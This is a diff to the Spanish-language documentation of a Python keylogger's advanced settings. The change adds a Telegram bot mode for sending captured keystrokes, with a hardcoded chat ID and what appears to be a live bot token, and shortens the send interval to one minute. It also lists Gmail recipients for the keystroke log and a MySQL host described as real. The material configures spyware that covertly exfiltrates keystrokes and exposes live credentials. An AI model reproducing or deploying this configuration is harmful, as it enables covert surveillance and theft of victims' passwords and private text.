@@ -6,7 +6,6 @@ Proceso de Opciones avanzada del keylogger.
 
 __NOTA:__ Si no sabe no toque.
 ````py
-
 # ***************************************   ZONA CUSTOM AVANZADA  ***********************************
 
 # NOTA:| Solo Cambie éstas variables si sabe      |
@@ -45,9 +44,10 @@ def passS():
 def ReceiveE():#Correos que recibirán el registro de teclas.
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
     return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
-# ************ Fin Zona Gmail ************* 
+# ************ End Zona Gmail ************* 
 
 # ************ Start Zone DATABASE ************* 
+# Nota: los datos de la base de datos son reales y publicas, solo para pruebas. 
 def DB_HOST():
     return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
 def DB_USER():
@@ -59,24 +59,26 @@ def DB_NAME():
 def DB_PORT(): 
     return "3306"                                                   # Opcional en algunos casos
 
-# ************ Fin Zone DATABASE ************* 
-def GMailOrDataBase():
-    return 1    # 1 = DataBase 
-                # 0 = Gmail
-                # (en las proximas actualizaciones , ambas a la vez)
+# ************ End Zone DATABASE ************* 
+def SendMode():
+    return 2    # 0 = Gmail
+                # 1 = DataBase              # Solo se puede usar una opción
+                # 2 = TelegramBot
+                
+                
+
 
 def timeSend(): # Tiempo de envío perzonalizado
-    return 20 #Minutos                 <= Escoja su tiempo en minutos
+    return 1 #Minutos                 <= Escoja su tiempo en minutos
 
-# ************ Zona MediaFire *************     
-# Se usará el API de Mediafire para subir el archivo reg.k(registro de teclas)
-#def MFUser():
-#    return "corroe@gmail.com"                   # Proximas actualizaciones...
+# ************ Zone Telegram *************     
+def ID():
+    return 831756903            # <=  ID de chat telegram [Nota] no lo coloque entre comillas
 
-#def MFPass():
-#    return "contra"
+def Token():
+    return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram
 
-# ************ Zona MediaFire ************* 
+# ************ Zona Telegram ************* 
 
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 ````
